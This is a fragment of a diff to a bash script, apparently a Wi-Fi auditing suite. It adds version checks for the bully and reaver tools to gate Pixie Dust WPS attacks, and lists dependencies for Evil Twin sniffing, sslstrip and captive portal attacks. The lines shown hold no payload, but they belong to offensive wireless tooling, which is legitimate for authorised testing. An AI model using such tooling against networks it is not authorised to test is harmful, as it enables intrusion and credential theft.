+	bully_version=$(bully -V 2> /dev/null)
+	bully_version=${bully_version:1:${#bully_version}}
+}
+
+#Determine reaver version
+function get_reaver_version() {
+
+	reaver_version=$(reaver -h 2> /dev/null | egrep "^Reaver v[0-9]" | awk '{print $2}')
+	reaver_version=${reaver_version:1:${#reaver_version}}
+}
+
+#Validate if bully version is able to perform integrated pixiewps attack
+function validate_bully_pixiewps_version() {
+
+	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_pixiewps_version}"; then
+		return 0
+	fi
+	return 1
+}
+
+#Validate if reaver version is able to perform integrated pixiewps attack
+function validate_reaver_pixiewps_version() {
+
+	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
+		return 0
+	fi
+	return 1
 }
 
 #Check for possible non Linux operating systems
@@ -8357,8 +9211,6 @@ function autodetect_language() {
 #Clean some known warnings for shellcheck tool
 function remove_warnings() {
 
-	echo "${g2_stdleft_window}" > /dev/null 2>&1
-	echo "${g2_stdright_window}" > /dev/null 2>&1
 	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
 	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
@@ -8368,6 +9220,11 @@ function remove_warnings() {
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
+	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
+	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
 }
 
 #Print a simple separator
